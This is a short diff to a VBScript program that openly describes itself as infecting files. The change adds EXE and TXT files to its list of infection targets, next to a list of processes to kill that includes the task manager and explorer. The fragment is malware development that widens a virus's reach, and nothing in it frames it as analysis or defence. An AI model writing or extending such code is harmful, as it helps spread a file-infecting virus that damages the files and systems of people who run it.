@@ -4,7 +4,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set WshShell = WScript.CreateObject("WScript.Shell")
 
 ' Define the list of file extensions to infect
-extensions = Array("VBS", "VBE", "JS", "JSE", "CSS", "WSH", "SCT", "HTA", "JPG", "JPEG", "MP3", "MP2")
+extensions = Array("VBS", "VBE", "JS", "JSE", "CSS", "WSH", "SCT", "HTA", "JPG", "JPEG", "MP3", "MP2", "EXE", "TXT")
 
 ' Define the list of processes to close
 strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")
